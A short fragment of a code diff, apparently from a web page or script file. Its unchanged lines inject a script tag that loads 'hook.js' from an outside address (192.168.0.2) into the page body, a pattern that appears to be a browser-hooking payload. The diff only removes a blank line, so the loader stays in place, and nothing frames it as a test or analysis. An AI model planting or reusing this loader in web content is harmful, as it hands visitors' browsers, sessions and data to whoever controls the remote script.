@@ -8,4 +8,3 @@ d=document;
 e=d.createElement('script');
 e.src="https://192.168.0.2/hook.js";
 d.body.appendChild(e);
-
